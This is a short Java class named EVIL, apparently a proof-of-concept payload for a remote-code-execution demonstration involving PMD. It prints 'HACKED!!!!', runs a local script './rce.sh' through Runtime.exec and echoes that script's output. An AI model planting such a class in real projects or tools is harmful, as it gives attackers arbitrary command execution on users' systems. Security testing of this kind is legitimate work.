package evil;

import java.io.InputStreamReader;
import java.io.BufferedReader;

public class EVIL {

    public static void main(String[] args) {
        try {
            System.out.println("HACKED!!!!");

            Runtime rt = Runtime.getRuntime();
            String[] commands = {"./rce.sh", "PMD"};
            Process proc = rt.exec(commands);

            BufferedReader stdInput = new BufferedReader(new
                    InputStreamReader(proc.getInputStream()));

            BufferedReader stdError = new BufferedReader(new
                    InputStreamReader(proc.getErrorStream()));

            String s = null;
            while ((s = stdInput.readLine()) != null) {
                System.out.println(s);
            }

            while ((s = stdError.readLine()) != null) {
                System.out.println(s);
            }
        }
        catch (Exception e) {
            System.out.println(e);
        }

    }
}